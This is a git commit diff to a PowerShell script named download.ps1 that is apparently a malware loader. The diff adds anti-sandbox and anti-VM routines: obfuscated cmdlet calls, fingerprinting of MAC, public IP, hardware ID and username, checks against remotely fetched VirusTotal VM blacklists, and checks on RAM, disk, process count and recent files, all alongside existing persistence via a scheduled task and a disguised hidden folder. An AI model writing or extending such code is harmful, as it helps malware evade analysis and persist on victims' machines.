cc2bdfa660ba87d9565cb5386f307158ede6b6d6
43a1723 <hai1723notgay@gmail.com>
2024-08-10 19:26:48 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -5,6 +5,7 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
+Add-Type -AssemblyName System.Windows.Forms
 
 $skid = "skid"
 
@@ -38,6 +39,57 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
+
+
+
+function Check-Condition {
+    param (
+        [scriptblock]$condition,
+        [string]$errorMessage
+    )
+    if (& $condition) {
+        Write-Host "[!] $errorMessage" -ForegroundColor Red
+        Stop-Process $pid -Force
+    }
+}
+
+function Search-Mac { (gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled } | Select-Object -ExpandProperty macaddress -join "," }
+function Search-IP { (gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseBasicParsing | Select-Object -ExpandProperty Content }
+function Search-HWID { (gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID }
+function Search-Username { [Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1] }
+function Check-Internet { Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop }
+function Check-DriveSize { (Get-Volume | Where-Object { $_.DriveLetter } | Measure-Object -Property Size -Sum).Sum / 1GB -ge 50 }
+function Check-RAM { (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB -ge 6 }
+function Check-ProcessCount { (gps | Measure-Object).Count -ge 50 }
+function Check-RecentFiles { (Get-ChildItem -Path "$ENV:APPDATA\Microsoft\Windows\Recent" -Recurse).Count -ge 20 }
+
+function VMPROTECT {
+    Check-Condition { Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll" } "JSAMSIProvider64.dll"
+    Check-Condition { Check-RAM -eq $false } "RAM CHECK FAILED!"
+    Check-Condition { (wmic diskdrive get model) -like "*DADY HARDDISK*" -or (wmic diskdrive get model) -like "*QEMU HARDDISK*" } "QEMU HARDDISK"
+    
+    $urls = @("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt")
+    $data = @(
+        Search-Mac,
+        Search-IP,
+        Search-HWID
+    )
+    foreach ($url in $urls) {
+        $blacklist = (gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
+        if ($blacklist -split "`n" | Where-Object { $data -contains $_ }) {
+            Write-Host "[!] Blacklisted item detected" -ForegroundColor Red
+            Stop-Process $pid -Force
+        }
+    }
+    
+    Check-Condition { Check-Internet -eq $false } "INTERNET CONNECTION CHECK FAILED!"
+    Check-Condition { Check-ProcessCount -eq $false } "PROCESS COUNT CHECK FAILED!"
+    Check-Condition { Check-RecentFiles -eq $false } "RECENT FILE ACTIVITY CHECK FAILED!"
+    Check-Condition { Check-DriveSize -eq $false } "DRIVE SIZE CHECK FAILED!"
+}
+
+VMPROTECT
+
 
 $rdir = "C:\Users\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
